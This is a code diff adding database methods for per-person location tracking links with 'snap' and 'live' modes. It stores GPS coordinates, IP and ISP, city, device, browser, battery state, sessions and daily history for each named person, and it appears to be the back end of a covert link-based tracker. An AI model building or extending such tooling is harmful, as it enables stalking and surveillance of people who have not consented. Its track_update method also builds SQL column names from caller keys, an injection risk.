@@ -652,3 +652,92 @@ class DB:
     def set_campaign_status(self, cid, status):
         with self.tx() as c:
             c.execute("UPDATE campaigns SET status=? WHERE id=?", (status, cid))
+    # ---- 位置追跡（人物ごと・一瞬/ライブ） ----
+    TRACK_MODES = ("snap", "live")
+
+    def add_track(self, code, person, mode="snap", interval=15, dest="", note=""):
+        mode = mode if mode in self.TRACK_MODES else "snap"
+        with self.tx() as c:
+            c.execute("""INSERT INTO links(code,name,dest,note,mode,created_at,hit_count,
+                active,person,interval,live,points)
+                VALUES(?,?,?,?,?,?,0,1,?,?,0,0)
+                ON CONFLICT(code) DO UPDATE SET name=excluded.name, dest=excluded.dest,
+                    note=excluded.note, mode=excluded.mode, person=excluded.person,
+                    interval=excluded.interval""",
+                (code, person, dest, note, mode, now(), person, int(interval)))
+        return code
+
+    def tracks(self, limit=500):
+        return self.q("SELECT rowid AS rid,* FROM links WHERE mode IN ('snap','live') "
+                      "ORDER BY name COLLATE NOCASE, created_at DESC LIMIT ?", (limit,))
+
+    def track_get(self, code):
+        return self.q1("SELECT rowid AS rid,* FROM links WHERE code=? "
+                       "AND mode IN ('snap','live')", (code,))
+
+    def set_track_live(self, code, live, sid=""):
+        with self.tx() as c:
+            c.execute("UPDATE links SET live=?, session_id=? WHERE code=?",
+                      (int(bool(live)), sid or "", code))
+
+    def track_update(self, code, **f):
+        if not f:
+            return
+        sets = ", ".join(f"{k}=?" for k in f)
+        with self.tx() as c:
+            c.execute(f"UPDATE links SET {sets} WHERE code=?", list(f.values()) + [code])
+
+    def del_track(self, code):
+        with self.tx() as c:
+            c.execute("DELETE FROM track_points WHERE code=?", (code,))
+            c.execute("DELETE FROM link_hits WHERE code=?", (code,))
+            c.execute("DELETE FROM link_answers WHERE code=?", (code,))
+            c.execute("DELETE FROM links WHERE code=?", (code,))
+
+    def clear_points(self, code):
+        with self.tx() as c:
+            c.execute("DELETE FROM track_points WHERE code=?", (code,))
+            c.execute("""UPDATE links SET points=0, live=0, session_id='',
+                last_ts=NULL, last_lat=NULL, last_lon=NULL, last_acc=NULL,
+                last_city=NULL, last_ip=NULL, last_src=NULL WHERE code=?""", (code,))
+
+    def add_points(self, code, rows):
+        if not rows:
+            return 0
+        cols = ["code", "link_id", "person", "sid", "ts", "kind", "src", "lat", "lon",
+                "acc", "spd", "hdg", "ip", "country", "country_code", "region", "city",
+                "isp", "asn", "device", "os", "browser", "inapp", "battery", "charging",
+                "screen", "note"]
+        with self.tx() as c:
+            c.executemany(f"INSERT INTO track_points({','.join(cols)}) "
+                          f"VALUES({','.join(['?'] * len(cols))})",
+                          [[r.get(k) for k in cols] for r in rows])
+        return len(rows)
+
+    def points(self, code, since=0, limit=3000, order="asc"):
+        o = "ASC" if order == "asc" else "DESC"
+        return self.q(f"SELECT * FROM track_points WHERE code=? AND id>? "
+                      f"ORDER BY id {o} LIMIT ?", (code, int(since), int(limit)))
+
+    def last_point(self, code):
+        r = self.q("SELECT * FROM track_points WHERE code=? AND lat IS NOT NULL "
+                   "ORDER BY id DESC LIMIT 1", (code,))
+        return r[0] if r else None
+
+    def point_count(self, code):
+        return self.q1("SELECT COUNT(*) n FROM track_points WHERE code=?", (code,))["n"]
+
+    def prune_points(self, code, keep=20000):
+        with self.tx() as c:
+            c.execute("""DELETE FROM track_points WHERE code=? AND id NOT IN
+                (SELECT id FROM track_points WHERE code=? ORDER BY id DESC LIMIT ?)""",
+                (code, code, int(keep)))
+
+    def track_sessions(self, code):
+        return self.q("""SELECT sid, MIN(ts) first, MAX(ts) last, COUNT(*) n
+            FROM track_points WHERE code=? AND sid<>'' GROUP BY sid
+            ORDER BY MAX(id) DESC LIMIT 100""", (code,))
+
+    def track_days(self, code):
+        return self.q("""SELECT substr(ts,1,10) d, COUNT(*) n, MIN(ts) first, MAX(ts) last
+            FROM track_points WHERE code=? GROUP BY d ORDER BY d DESC LIMIT 60""", (code,))
